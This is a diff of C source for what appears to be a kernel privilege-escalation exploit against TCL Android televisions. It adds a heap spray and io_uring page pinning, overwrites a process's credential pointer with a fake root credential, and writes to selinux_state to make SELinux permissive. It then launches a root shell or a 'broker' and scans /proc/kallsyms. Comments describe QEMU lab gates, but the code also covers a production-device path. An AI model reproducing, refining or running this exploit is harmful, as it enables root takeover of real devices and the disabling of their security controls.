+  p->control->command = (uint32_t)(unsigned char)command;
+  atomic_thread_fence(memory_order_release);
+  atomic_store_explicit(&p->control->command_seq, seq,
+                        memory_order_release);
+}
+
+static int tcl_victim_ping(struct child_pipes *p, pid_t victim_pid,
+                           const char *stage) {
+  uint32_t report = 0;
+  if (!tcl_victim_word(p, victim_pid, 'P', &report, stage)) return 0;
+  if (report != 0x50494e47u) {
+    pr_warning("TCL W2 IPC %s: bad ping reply=%#x\n", stage, report);
+    return 0;
+  }
+  return 1;
+}
+
+static int tcl_victim_uid(struct child_pipes *p, pid_t victim_pid,
+                          uint32_t *uid_out, const char *stage) {
+  return tcl_victim_word(p, victim_pid, 'C', uid_out, stage);
+}
+
+static int tcl_victim_unshare_files(struct child_pipes *p,
+                                    pid_t victim_pid) {
+  uint32_t report = 0;
+  if (!tcl_victim_word(p, victim_pid, 'U', &report, "unshare-files"))
+    return 0;
+  if (report != 0x554e5348u) {
+    pr_warning("TCL victim CLONE_FILES unshare failed errno=%u\n", report);
+    return 0;
+  }
+  pr_info("TCL victim owns a private descriptor table; W2 page pinned\n");
+  return 1;
+}
+
+/* Capture the reclaim page before creating the victim.  A live victim mm
+ * changes the exact SLUB population and made the QEMU/TV reclaim less
+ * deterministic.  Once the page is pinned by io_uring, create the victim
+ * with CLONE_FILES, learn its task address, rewrite the still-inactive
+ * payload to that address, and only then fire the PI route. */
+static int do_tcl_external_cred_write(struct child_pipes *pipes,
+                                      pid_t *victim_pid,
+                                      uintptr_t *victim_task,
+                                      const char *desc) {
+  pr_info("=== %s (capture-before-victim) ===\n", desc);
+  ghost_reset_plans();
+  g_route_write_ok = 0;
+  pselect_child_node = 1;
+  set_pselect_write_mode(g_leaked_task + TASK_CRED_OFF, 0,
+                         WRITE_MODE_CRED);
+  TIMER("  heap spray start");
+  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+  if (!page_base) {
+    pr_warning("  heap spray failed or was refused by the capture gate\n");
+    clear_pselect_write();
+    return 0;
+  }
+
+  *victim_pid = spawn_tcl_shared_victim(pipes, victim_task);
+  if (*victim_pid < 0 || !*victim_task) {
+    pr_warning("  verified shared-files victim unavailable after capture\n");
+    clear_pselect_write();
+    return 0;
+  }
+  /* Prove the control channel before touching the victim credential.  This
+   * turns a later missing reply into a post-write failure rather than an
+   * ambiguous pipe/setup failure. */
+  uint32_t pre_uid = UINT32_MAX;
+  if (!tcl_victim_ping(pipes, *victim_pid, "pre-write-ping") ||
+      !tcl_victim_uid(pipes, *victim_pid, &pre_uid, "pre-write-uid")) {
+    pr_warning("  verified victim IPC unavailable before W2\n");
+    tcl_victim_send(pipes, 'X');
+    clear_pselect_write();
+    return 0;
+  }
+  pr_info("  victim IPC verified before W2: pid=%d uid=%u\n",
+          *victim_pid, pre_uid);
+  set_pselect_write_mode(*victim_task + TASK_CRED_OFF, 0,
+                         WRITE_MODE_CRED);
+  if (!tcl_refresh_captured_page(page_base, PAGE_PAYLOAD_FOPS)) {
+    tcl_victim_send(pipes, 'X');
+    clear_pselect_write();
+    return 0;
+  }
+  pr_info("  victim pid=%d task=%016lx target=%016lx\n", *victim_pid,
+          (unsigned long)*victim_task,
+          (unsigned long)(*victim_task + TASK_CRED_OFF));
+  TIMER("  heap spray retargeted");
+  g_tcl_external_cred_target = 1;
+  run_main_route_threads();
+  int attempts = env_int_range("TCL_W2_ATTEMPTS", 3, 1, 5);
+  int force_retry = env_flag("TCL_W2_FORCE_RETRY", 0);
+  if (g_route_write_ok && force_retry) {
+    pr_info("TCL W2 forced retry gate: first landing accepted then "
+            "re-armed for regression\n");
+    g_route_write_ok = 0;
+  }
+  for (int attempt = 2; !g_route_write_ok && attempt <= attempts; attempt++) {
+    if (!ghost_rearm_captured_write(*victim_task + TASK_CRED_OFF,
+                                    page_base + FAKE_CRED_OFF)) {
+      pr_warning("TCL W2 same-page re-arm failed attempt=%d/%d\n",
+                 attempt, attempts);
+      break;
+    }
+    g_tcl_split_settle_usec = 50000 + (attempt - 1) * 30000;
+    pr_info("TCL W2 same-page carrier retry=%d/%d settle_us=%d\n",
+            attempt, attempts, g_tcl_split_settle_usec);
+    run_main_route_threads();
+  }
+  g_tcl_split_settle_usec = 50000;
+  g_tcl_external_cred_target = 0;
+  clear_pselect_write();
+  return 1;
+}
+
 static int run_selftest(void) {
   disable_rseq_for_thread();
   set_unbuffer();
@@ -2039,11 +2706,15 @@ static int run_selftest(void) {
 }
 
 #if defined(TCL_V643_LAB_ARMING) && TCL_V643_LAB_ARMING
-/* QEMU-only gate for the final TCL strategy.  The first cycle proves a
- * page-local arbitrary write.  The second cycle starts from a completely
- * fresh mm_struct reclaim and changes this task's cred pointer, after which
- * run_main_route_threads() asks the normal credential subsystem to commit a
- * legitimate uid/gid-0 credential.  /dev/glqemu-root exists only in the
+#if defined(TCL_QEMU_EMBED_BROKER) && TCL_QEMU_EMBED_BROKER
+extern int tcl_root_broker_main(int argc, char **argv);
+#endif
+
+/* QEMU-only gate for the final TCL handoff strategy.  It targets a
+ * pre-spawned victim which shares the parent's descriptor table, then asks
+ * that raw-root victim to fork a normalized broker worker.  The independent
+ * page-local primitive gate is kept in the witness tests; repeating it here
+ * only adds an unrelated timing race. /dev/glqemu-root exists only in the
  * disposable laboratory kernel and is never present on a TCL television. */
 static int run_qemu_two_cycle_root(void) {
   struct tcl_qemu_root_layout {
@@ -2065,7 +2736,7 @@ static int run_qemu_two_cycle_root(void) {
   if (!active_offsets ||
       active_offsets->reclaim_route != GHOST_RECLAIM_TCL_V643_EXACT ||
       active_offsets->stack_overlay_route !=
-          GHOST_STACK_OVERLAY_TCL_V643_MCAST_COMPAT) {
+          GHOST_STACK_OVERLAY_TCL_V643_NEWSELECT_COMPAT) {
     pr_error("QEMU two-cycle gate requires the exact TCL split profile\n");
     return 1;
   }
@@ -2076,22 +2747,27 @@ static int run_qemu_two_cycle_root(void) {
   kaslr_done = 1;
   timer_reset();
 
-  int qfd = open("/dev/glqemu-root", O_RDONLY | O_CLOEXEC);
+  int qfd = open("/dev/glqemu-root", O_RDWR | O_CLOEXEC);
   memset(&layout, 0, sizeof(layout));
   if (qfd < 0 || ioctl(qfd, TCL_QEMU_GET_LAYOUT, &layout) != 0) {
     pr_error("QEMU layout observer unavailable errno=%d\n", errno);
     if (qfd >= 0) close(qfd);
     return 1;
   }
+  void *qemu_probe = mmap(NULL, 0x4000, PROT_READ | PROT_WRITE,
+                          MAP_SHARED, qfd, 0);
   close(qfd);
-  if (!layout.current_task || layout.page_order != 2 ||
+  if (qemu_probe == MAP_FAILED || !layout.current_task ||
+      layout.page_order != 2 ||
       layout.task_cred_off != TASK_CRED_OFF ||
       layout.task_real_cred_off != TASK_REAL_CRED_OFF ||
       layout.cred_size != CRED15_SIZE) {
-    pr_error("QEMU layout mismatch task=%016llx order=%u cred=%#x/%#x size=%u\n",
+    pr_error("QEMU layout mismatch task=%016llx order=%u cred=%#x/%#x "
+             "expected=%#x/%#x size=%u expected_size=%u\n",
              (unsigned long long)layout.current_task, layout.page_order,
              layout.task_cred_off, layout.task_real_cred_off,
-             layout.cred_size);
+             (unsigned)TASK_CRED_OFF, (unsigned)TASK_REAL_CRED_OFF,
+             layout.cred_size, (unsigned)CRED15_SIZE);
     return 1;
   }
   const char *ns = getenv("TCL_QEMU_INIT_USER_NS");
@@ -2114,23 +2790,75 @@ static int run_qemu_two_cycle_root(void) {
     return 1;
   }
 
-  pr_info("GL2CYCLE start uid=%d task=%016llx init_user_ns=%016lx\n",
+  pr_info("GLHANDOFF start uid=%d parent_task=%016llx init_user_ns=%016lx\n",
           getuid(), (unsigned long long)g_leaked_task,
           (unsigned long)g_init_user_ns_addr);
-  if (!do_one_write(0, "QEMU cycle 1 page-local write", 5) ||
-      !g_route_write_ok) {
-    pr_error("GL2CYCLE cycle 1 failed\n");
+
+  struct child_pipes victim_pipes;
+  memset(&victim_pipes, 0, sizeof(victim_pipes));
+  uintptr_t victim_task = 0;
+  pid_t victim_pid = -1;
+  int w2_started = do_tcl_external_cred_write(
+      &victim_pipes, &victim_pid, &victim_task,
+      "QEMU victim credential root");
+  if (!w2_started || !g_route_write_ok) {
+    tcl_victim_send(&victim_pipes, 'X');
+    pr_error("GLHANDOFF credential primitive failed; parent uid=%d\n", getuid());
     return 1;
   }
-  pr_info("GL2CYCLE cycle 1 PASS; starting fresh reclaim\n");
-  if (!do_one_write(g_leaked_task + TASK_CRED_OFF,
-                    "QEMU cycle 2 credential root", WRITE_MODE_CRED) ||
-      !g_route_write_ok || getuid() != 0 || geteuid() != 0 || getgid() != 0) {
-    pr_error("GL2CYCLE cycle 2 failed uid=%d euid=%d gid=%d\n",
-             getuid(), geteuid(), getgid());
+  uint32_t victim_uid = UINT32_MAX;
+  if (!tcl_victim_ping(&victim_pipes, victim_pid, "post-write-ping") ||
+      !tcl_victim_uid(&victim_pipes, victim_pid, &victim_uid,
+                      "post-write-uid") ||
+      victim_uid != 0) {
+    tcl_victim_send(&victim_pipes, 'X');
+    pr_error("GLHANDOFF did not root victim uid=%u parent_uid=%d\n",
+             victim_uid, getuid());
     return 1;
   }
-  pr_success("GL2CYCLE PASS: two fresh production reclaims changed uid 1000 -> 0\n");
+  if (!tcl_victim_unshare_files(&victim_pipes, victim_pid)) {
+    tcl_victim_send(&victim_pipes, 'X');
+    pr_error("GLHANDOFF victim could not pin W2 descriptors privately\n");
+    return 1;
+  }
+  pr_success("GLHANDOFF W2 PASS: victim uid 1000 -> 0; parent remains uid=%d\n",
+             getuid());
+
+  uintptr_t reuse_target = layout.page_kva + SELFTEST_OFF;
+  uintptr_t reuse_value = layout.page_kva + SELFTEST_VALUE;
+  *(volatile uint64_t *)((uint8_t *)qemu_probe + SELFTEST_OFF) = 0;
+  if (!do_tcl_reuse_captured_write(reuse_target, reuse_value,
+                                   "QEMU same-page second write",
+                                   WRITE_MODE_CRED_SELINUX) ||
+      *(volatile uint64_t *)((uint8_t *)qemu_probe + SELFTEST_OFF) !=
+          reuse_value) {
+    tcl_victim_send(&victim_pipes, 'X');
+    pr_error("GLHANDOFF same-page second write failed got=%016llx want=%016lx\n",
+             (unsigned long long)*(volatile uint64_t *)(
+                 (uint8_t *)qemu_probe + SELFTEST_OFF),
+             (unsigned long)reuse_value);
+    return 1;
+  }
+  uint32_t post_reuse_uid = UINT32_MAX;
+  if (!tcl_victim_ping(&victim_pipes, victim_pid, "post-reuse-ping") ||
+      !tcl_victim_uid(&victim_pipes, victim_pid, &post_reuse_uid,
+                      "post-reuse-uid") ||
+      post_reuse_uid != 0) {
+    tcl_victim_send(&victim_pipes, 'X');
+    pr_error("GLHANDOFF same-page write damaged W2 victim uid=%u\n",
+             post_reuse_uid);
+    return 1;
+  }
+  pr_success("GLHANDOFF SAME-PAGE PASS: second write landed; W2 victim remains uid=0\n");
+  uint32_t broker_pid = 0;
+  if (!tcl_victim_word(&victim_pipes, victim_pid, 'G', &broker_pid,
+                       "broker-start") ||
+      !broker_pid) {
+    pr_error("GLHANDOFF normalized broker worker did not start\n");
+    return 1;
+  }
+  pr_success("GLHANDOFF PASS: normalized broker worker pid=%u\n",
+             broker_pid);
   return 0;
 #undef TCL_QEMU_GET_LAYOUT
 }
@@ -2138,12 +2866,10 @@ static int run_qemu_two_cycle_root(void) {
 
 /* --cred: task_struct leak (perf regs) + KASLR base (perf min_ip) +
  * three-walk route (mode 7, default):
- *   walk 0: 8-byte ZERO at selinux_state (enforcing=0 AND initialized=0
- *           -> avc_denied() never denies, security_compute_av()
- *           short-circuits to allowed=~0: full permissive). This kills
- *           the kernel-SID EACCES problem: the main thread keeps sid=1
- *           (u:r:kernel) but nothing is denied anymore, so openat/exec
- *           work for the root shell.
+ *   walk 0: preserving pointer at selinux_state (enforcing=0,
+ *           checkreqprot=0, initialized remains non-zero).  Its upper five
+ *           bytes temporarily replace policycap[0..4], so the normalized
+ *           handoff must reload+verify the live policy before setenforce(1).
  *   walk 1: task->cred = fake_cred (uid 0, caps FULL, self-contained
  *           fake user_namespace on the spray page)
  *   walk 2: task->real_cred = fake_cred (required: commit_creds() at
@@ -2155,10 +2881,44 @@ static int run_qemu_two_cycle_root(void) {
  * cannot be armed safely (no selinux_state offset, kaslr sanity failed,
  * or GHOST_SELINUX=0). */
 static int run_cred_swap(void) {
+  char direct_broker_path[512] = {0};
+  char direct_broker_uid[16] = {0};
+  char direct_broker_abstract[80] = {0};
+  int direct_broker_enabled = 0;
+  int direct_resukisu_enabled = 0;
+  {
+    const char *path = getenv("GHOST_DIRECT_BROKER");
+    const char *uid = getenv("GHOST_BROKER_UID");
+    const char *name = getenv("GHOST_BROKER_ABSTRACT");
+    if (path && path[0] && uid && uid[0]) {
+      snprintf(direct_broker_path, sizeof(direct_broker_path), "%s", path);
+      snprintf(direct_broker_uid, sizeof(direct_broker_uid), "%s", uid);
+      snprintf(direct_broker_abstract, sizeof(direct_broker_abstract), "%s",
+               name && name[0] ? name : "tcl_root_broker");
+      direct_broker_enabled = 1;
+    }
+    const char *handoff = getenv("GHOST_RESUKISU_HANDOFF");
+    const char *preflight = getenv("GHOST_RESUKISU_PREFLIGHT");
+    const char *ksud = getenv("GHOST_RESUKISU_KSUD");
+    const char *module = getenv("GHOST_RESUKISU_MODULE");
+    const char *status = getenv("GHOST_RESUKISU_STATUS");
+    direct_resukisu_enabled = handoff && handoff[0] && preflight &&
+                              preflight[0] && ksud && ksud[0] && module &&
+                              module[0] && status && status[0];
+  }
+  int direct_handoff_enabled =
+      direct_broker_enabled || direct_resukisu_enabled;
   disable_rseq_for_thread();
   set_unbuffer();
   set_limit();
   if (!active_offsets && select_offsets() < 0) return 1;
+  if (active_offsets &&
+      active_offsets->reclaim_route == GHOST_RECLAIM_TCL_V643_EXACT &&
+      !direct_handoff_enabled) {
+    pr_error("TCL production root is fail-closed without a direct handoff; "
+             "raw-root exec is forbidden\n");
+    return 1;
+  }
   init_p0_profile();
   init_ashmem_path();
   pin_to_core(CORE);
@@ -2246,10 +3006,46 @@ static int run_cred_swap(void) {
               (have_state >= 0 || have_avc >= 0)
                   ? " - PAIR AGREEMENT"
                   : " (no pair candidates sampled; enforce readback will verify)");
-      selinux_mode = 1;
-      g_selinux_write_armed = 1;
-      pr_info("mode 7 armed: plan0 selinux zero, plan1 cred, "
-              "plan2 real_cred\n");
+      uintptr_t symbol_base = runtime_static_symbol_base();
+      int preserve_initialized =
+          env_flag("GHOST_SELINUX_PRESERVE_INIT", 1);
+      g_selinux_stamp_value = 0;
+      if (preserve_initialized) {
+        uintptr_t wake_start = symbol_base +
+                               TCL_V643_NON_IRQ_WAKE_REASON_OFF;
+        uintptr_t wake_end = wake_start +
+                             TCL_V643_NON_IRQ_WAKE_REASON_SIZE;
+        uintptr_t stamp = symbol_base +
+                          TCL_V643_SELINUX_STAMP_PARENT_OFF;
+        const unsigned char *stamp_bytes =
+            (const unsigned char *)&stamp;
+        if (stamp < wake_start || stamp + 16 > wake_end ||
+            stamp_bytes[0] != 0 || stamp_bytes[1] != 0 ||
+            stamp_bytes[2] == 0) {
+          g_selinux_target = 0;
+          pr_warning("SELinux preserving write NOT armed: stamp geometry "
+                     "failed (stamp=%016lx wake=%016lx..%016lx)\n",
+                     (unsigned long)stamp, (unsigned long)wake_start,
+                     (unsigned long)wake_end);
+          preserve_initialized = 0;
+        } else {
+          g_selinux_stamp_value = stamp;
+          pr_info("SELinux preserving stamp=%016lx bytes=%02x,%02x,%02x; "
+                  "policycap reload required; +8 collateral confined to "
+                  "non_irq_wake_reason\n",
+                  (unsigned long)stamp, stamp_bytes[0], stamp_bytes[1],
+                  stamp_bytes[2]);
+        }
+      }
+      if (!g_selinux_target) {
+        pr_warning("SELinux mode disabled after preserving-write gate\n");
+      } else {
+        selinux_mode = 1;
+        g_selinux_write_armed = 1;
+        pr_info("mode 7 armed: plan0 selinux %s, plan1 cred, "
+                "plan2 real_cred\n",
+                g_selinux_stamp_value ? "preserve-initialized" : "zero");
+      }
     } else {
       g_selinux_target = 0;
       pr_warning("selinux write NOT armed (bad derived target) - "
@@ -2439,6 +3235,7 @@ static int run_cred_swap(void) {
       __atomic_thread_fence(__ATOMIC_SEQ_CST);
       for (int w = 0; w < 6000 && !relay->ready; w++)
         usleep(100000);
+      if (relay->ready == 99) _exit(0);
       if (relay->ready && relay->len > 0) {
         char pre[512];
         int pl = snprintf(pre, sizeof(pre),
@@ -2591,6 +3388,19 @@ static int run_cred_swap(void) {
     }
   }
 
+  struct child_pipes root_victim_pipes;
+  memset(&root_victim_pipes, 0, sizeof(root_victim_pipes));
+  uintptr_t root_victim_task = 0;
+  pid_t root_victim_pid = -1;
+  if (direct_handoff_enabled) {
+    if (!selinux_mode) {
+      if (relay != MAP_FAILED) relay->ready = 99;
+      pr_error("TCL safe handoff requires the verified SELinux cycle; "
+               "refusing a broker exec under enforcing\n");
+      return 1;
+    }
+  }
+
   /* SID resolution config (read NOW: post-walk code must not call libc
    * env/parse helpers). Preference order after root: cached SID from
    * .gl_sid_cache (child-loaded, live-verified) > GHOST_SID env override
@@ -2619,23 +3429,63 @@ static int run_cred_swap(void) {
     if (env_flag("CRED_SLAB_DRAIN", 0))
       slab_drain();
     g_consumer_task = 0;
-    /* TCL uses two independent one-erase cycles.  Rewalking the residual
-     * waiter for SELinux + cred + real_cred was the remaining unstable
-     * route.  First zero selinux_state, verify selinuxfs, then reclaim a
-     * fresh page and install task->cred.  setresgid/setresuid in the split
-     * coordinator makes the kernel commit a normal cred to both pointers. */
+    /* TCL uses two independent one-erase cycles.  W2 runs first while
+     * SELinux is still enforcing.  Once the victim verifies uid 0 it
+     * unshares CLONE_FILES, preserving the W2 io_uring page in a private fd
+     * table.  Only then does W1 open the bounded permissive window.  Thus a
+     * W2 failure cannot leave SELinux permissive; after any possible W1
+     * landing, only policy reload + verification or reboot may close it. */
     if (selinux_mode && active_offsets->reclaim_route ==
                             GHOST_RECLAIM_TCL_V643_EXACT) {
-      if (!do_one_write(g_selinux_target, "selinux zero",
-                        WRITE_MODE_CRED_SELINUX) ||
+      if (root_victim_pid >= 0) {
+        pr_error("TCL safe handoff does not retry reclaim with a live raw "
+                 "victim; reboot is the cleanup boundary\n");
+        return 1;
+      }
+      int victim_write = do_tcl_external_cred_write(
+          &root_victim_pipes, &root_victim_pid, &root_victim_task,
+          "victim cred swap");
+      uint32_t early_uid = UINT32_MAX;
+      int early_uid_read = 0;
+      if (root_victim_pid >= 0 && root_victim_task)
+        early_uid_read =
+            tcl_victim_ping(&root_victim_pipes, root_victim_pid,
+                            "post-write-ping") &&
+            tcl_victim_uid(&root_victim_pipes, root_victim_pid, &early_uid,
+                           "post-write-uid");
+      if (!victim_write || !g_route_write_ok || root_victim_pid < 0 ||
+          !root_victim_task || !early_uid_read || early_uid != 0) {
+        if (root_victim_pid >= 0)
+          tcl_victim_send(&root_victim_pipes, 'X');
+        if (relay != MAP_FAILED) relay->ready = 99;
+        pr_error("TCL safe handoff: W2 victim verification failed uid=%u\n",
+                 early_uid);
+        return 1;
+      }
+      if (!tcl_victim_unshare_files(&root_victim_pipes, root_victim_pid)) {
+        tcl_victim_send(&root_victim_pipes, 'X');
+        if (relay != MAP_FAILED) relay->ready = 99;
+        pr_error("TCL safe handoff: victim could not pin W2 descriptors\n");
+        return 1;
+      }
+      pr_success("TCL W2 verified before permissive window: victim pid=%d "
+                 "task=%016lx parent_uid=%u\n", root_victim_pid,
+                 (unsigned long)root_victim_task, (unsigned)getuid());
+
+      if (!do_tcl_reuse_captured_write(
+              g_selinux_target, g_selinux_stamp_value,
+              g_selinux_stamp_value
+                  ? "selinux preserve-initialized"
+                  : "selinux zero",
+              WRITE_MODE_CRED_SELINUX) ||
           !g_route_write_ok || !check_selinux_off()) {
-        pr_warning("TCL SELinux cycle did not verify enforce=0\n");
-        continue;
+        tcl_victim_send(&root_victim_pipes, 'X');
+        if (relay != MAP_FAILED) relay->ready = 99;
+        pr_error("TCL SELinux cycle failed; root victim will reboot if "
+                 "the permissive write landed\n");
+        return 1;
       }
       g_selinux_off = 1;
-      if (!do_one_write(g_leaked_task + TASK_CRED_OFF, "cred swap",
-                        WRITE_MODE_CRED))
-        continue;
     } else {
       if (!do_one_write(selinux_mode ? g_selinux_target
                                      : g_leaked_task + TASK_CRED_OFF,
@@ -2644,6 +3494,40 @@ static int run_cred_swap(void) {
                                        WRITE_MODE_CRED))
         continue;
     }
+
+  if (direct_handoff_enabled) {
+      uint32_t victim_uid = UINT32_MAX;
+      if (!g_route_write_ok ||
+          !tcl_victim_uid(&root_victim_pipes, root_victim_pid, &victim_uid,
+                          "pre-broker-uid") ||
+          victim_uid != 0) {
+        tcl_victim_send(&root_victim_pipes, 'X');
+        if (relay != MAP_FAILED) relay->ready = 99;
+        pr_error("TCL victim did not verify uid 0 after W1 (uid=%u); "
+                 "reboot cleanup requested\n", victim_uid);
+        return 1;
+      }
+      pr_success("TCL victim root verified; parent uid=%u remains unchanged\n",
+                 (unsigned)getuid());
+      uint32_t broker_pid = 0;
+      if (!tcl_victim_word(&root_victim_pipes, root_victim_pid, 'G',
+                           &broker_pid, "broker-start") ||
+          !broker_pid) {
+        pr_error("TCL safe handoff: normalized worker failed\n");
+        return 1;
+      }
+      pr_success("TCL safe handoff: normalized %s pid=%u; raw victim "
+                 "holds reclaim descriptors until handoff completes\n",
+                 direct_resukisu_enabled ? "ReSukiSU loader" : "broker",
+                 broker_pid);
+      if (relay != MAP_FAILED) {
+        __atomic_thread_fence(__ATOMIC_SEQ_CST);
+        relay->ready = 99;
+        __atomic_thread_fence(__ATOMIC_SEQ_CST);
+      }
+      return 0;
+    }
+
     uint32_t uid_now = syscall(__NR_getuid);
     if (g_route_write_ok && (uid_now == 0 || uid_now == 0xffffff80u)) {
       /* ============ ROOT ACHIEVED - raw syscalls ONLY from here on ===== */
@@ -3097,7 +3981,9 @@ static int run_cred_swap(void) {
            * adb pty as an interactive root shell (it survives the
            * parent's exit_group as an orphan; the io_uring fds backing
            * the fake cred page stay open in the child). */
-          RELAY_STR("=== ROOT SHELL: clone+exec /system/bin/sh ===\n");
+          RELAY_STR(direct_broker_enabled
+                        ? "=== ROOT BROKER: clone+exec direct ===\n"
+                        : "=== ROOT SHELL: clone+exec /system/bin/sh ===\n");
           __atomic_thread_fence(__ATOMIC_SEQ_CST);
           if (relay != MAP_FAILED) relay->ready = 1;
           /* Clean up any stale test files that might block us */
@@ -3118,22 +4004,37 @@ static int run_cred_swap(void) {
                 syscall(__NR_fsync, mk);
                 syscall(__NR_close, mk);
               }
-              static const char *sh_path = "/system/bin/sh";
-              const char *sh_argv[] = { "sh", NULL };
               const char *sh_envp[] = {
                 "PATH=/sbin:/system/sbin:/system/bin:/system/xbin:/vendor/bin",
                 "HOME=/data/local/tmp",
                 "TERM=xterm-256color",
                 NULL,
               };
-              syscall(__NR_execve, sh_path, (char *const *)sh_argv,
-                      (char *const *)sh_envp);
+              if (direct_broker_enabled) {
+                const char *broker_argv[] = {
+                  direct_broker_path, "--direct-child", "--uid",
+                  direct_broker_uid,
+                  "--abstract", direct_broker_abstract,
+                  "--arm-timeout-ms", "15000",
+                  "--reboot-after-ms", "45000", NULL
+                };
+                syscall(__NR_execve, direct_broker_path,
+                        (char *const *)broker_argv, (char *const *)sh_envp);
+              } else {
+                static const char *sh_path = "/system/bin/sh";
+                const char *sh_argv[] = { "sh", NULL };
+                syscall(__NR_execve, sh_path, (char *const *)sh_argv,
+                        (char *const *)sh_envp);
+              }
               /* execve failed - report and die */
-              static const char em[] = "[!] root shell: execve failed\n";
+              static const char em[] = "[!] root handoff: execve failed\n";
               syscall(__NR_write, 1, em, sizeof(em) - 1);
               syscall(__NR_exit, 127);
             }
-            RELAY_STR("root shell child pid="); RELAY_DEC(cpid);
+            RELAY_STR(direct_broker_enabled
+                          ? "root broker child pid="
+                          : "root shell child pid=");
+            RELAY_DEC(cpid);
             RELAY_STR(cpid > 0 ? "\n" : " (clone FAILED)\n");
             if (cpid > 0) shell_spawned = 1;
           } else {
@@ -3191,36 +4092,48 @@ static int run_cred_swap(void) {
         RELAY_STR(" hits="); RELAY_DEC(hits);
         RELAY_STR("/"); RELAY_DEC(plans); RELAY_STR("\n");
 
-        /* kallsyms scan (only if we have a working SID or via relay) */
-        RELAY_STR("kallsyms: trying open...\n");
-        int kf = (int)syscall(__NR_openat, AT_FDCWD,
-                              "/proc/kallsyms", O_RDONLY, 0);
-        if (kf >= 0) {
-          RELAY_STR("kallsyms: OPEN OK, scanning...\n");
-          char kb[4096]; long kn; int found = 0;
-          while (!found && (kn = syscall(__NR_read, kf, kb, sizeof(kb))) > 0) {
-            for (long i = 0; i < kn - 16; i++) {
-              if (kb[i]==' ' && kb[i+2]==' ' &&
-                  kb[i+3]=='s' && kb[i+4]=='e' && kb[i+5]=='l' &&
-                  kb[i+6]=='i' && kb[i+7]=='n' && kb[i+8]=='u' &&
-                  kb[i+9]=='x' && kb[i+10]=='_' && kb[i+11]=='s' &&
-                  kb[i+12]=='t' && kb[i+13]=='a' && kb[i+14]=='t' &&
-                  kb[i+15]=='e') {
-                int ls = (int)i - 1;
-                while (ls > 0 && kb[ls-1] != '\n') ls--;
-                int le = (int)i + 16;
-                while (le < (int)kn && kb[le] != '\n') le++;
-                RELAY_STR("FOUND: ");
-                for (int _j = ls; _j < le; _j++) RELAY_PUTC(kb[_j]);
-                RELAY_STR("\n");
-                found = 1; break;
+        /* Reading /proc/kallsyms through seq_file after the credential
+         * replacement wedged the TCL production kernel in two independent
+         * runs.  It is diagnostic-only and the direct broker already has
+         * every address it needs, so never enter that path for the minimal
+         * application handoff. */
+        if (direct_broker_enabled || ghost_minimal) {
+          RELAY_STR("kallsyms: skipped in minimal/direct-broker mode\n");
+        } else {
+          RELAY_STR("kallsyms: trying open...\n");
+          int kf = (int)syscall(__NR_openat, AT_FDCWD,
+                                "/proc/kallsyms", O_RDONLY, 0);
+          if (kf >= 0) {
+            RELAY_STR("kallsyms: OPEN OK, scanning...\n");
+            char kb[4096]; long kn; int found = 0;
+            while (!found &&
+                   (kn = syscall(__NR_read, kf, kb, sizeof(kb))) > 0) {
+              for (long i = 0; i < kn - 16; i++) {
+                if (kb[i]==' ' && kb[i+2]==' ' &&
+                    kb[i+3]=='s' && kb[i+4]=='e' && kb[i+5]=='l' &&
+                    kb[i+6]=='i' && kb[i+7]=='n' && kb[i+8]=='u' &&
+                    kb[i+9]=='x' && kb[i+10]=='_' && kb[i+11]=='s' &&
+                    kb[i+12]=='t' && kb[i+13]=='a' && kb[i+14]=='t' &&
+                    kb[i+15]=='e') {
+                  int ls = (int)i - 1;
+                  while (ls > 0 && kb[ls-1] != '\n') ls--;
+                  int le = (int)i + 16;
+                  while (le < (int)kn && kb[le] != '\n') le++;
+                  RELAY_STR("FOUND: ");
+                  for (int _j = ls; _j < le; _j++) RELAY_PUTC(kb[_j]);
+                  RELAY_STR("\n");
+                  found = 1; break;
+                }
               }
             }
+            if (!found)
+              RELAY_STR("selinux_state: NOT FOUND (scanned to EOF)\n");
+            syscall(__NR_close, kf);
+          } else {
+            RELAY_STR("kallsyms: OPEN DENIED errno=");
+            RELAY_DEC(errno);
+            RELAY_STR("\n");
           }
-          if (!found) RELAY_STR("selinux_state: NOT FOUND (scanned to EOF)\n");
-          syscall(__NR_close, kf);
-        } else {
-          RELAY_STR("kallsyms: OPEN DENIED errno="); RELAY_DEC(errno); RELAY_STR("\n");
         }
         RELAY_STR("=== relay done ===\n");
         __atomic_thread_fence(__ATOMIC_SEQ_CST);
@@ -3519,6 +4432,37 @@ ghost_battery_done:
           RAW_WRITE(1, ") - skipping exec (commit_creds BUG_ON guard); "
                       "battery written\n");
         }
+      }
+      /* The pre-exploit relay is a separate process and otherwise keeps the
+       * ADB stdout pipe open after a successful one-shot root shell exits.
+       * Tell it to leave its command loop before this process exits.  A
+       * daemon launched by the root shell has already detached by then. */
+      if (relay != MAP_FAILED) {
+        if (direct_broker_enabled && g_selinux_off) {
+          int enforcing = 0;
+          for (int i = 0; i < 100; i++) {
+            enforcing = raw_selinux_enforcing();
+            if (enforcing == 1) break;
+            struct timespec pause = {.tv_sec = 0, .tv_nsec = 50000000};
+            syscall(__NR_nanosleep, &pause, NULL);
+          }
+          if (enforcing != 1) {
+            /* The preserving pointer has temporarily replaced
+             * selinux_state.policycap[0..4].  Enabling enforcement here
+             * would activate always_check_network/cgroup_seclabel with
+             * garbage values and can cut both TV interfaces.  Only the
+             * normalized broker may first reload+verify the live policy;
+             * its on-device watchdog reboots if that repair fails. */
+            RELAY_STR("failsafe: broker did not restore policy/network; "
+                      "direct enforcing forbidden, watchdog/reboot required\n");
+          } else {
+            RELAY_STR("failsafe: broker restored policy/network then "
+                      "SELinux enforcing\n");
+          }
+        }
+        __atomic_thread_fence(__ATOMIC_SEQ_CST);
+        relay->ready = 99;
+        __atomic_thread_fence(__ATOMIC_SEQ_CST);
       }
       syscall(__NR_fsync, 1);
       syscall(__NR_exit_group, 99);
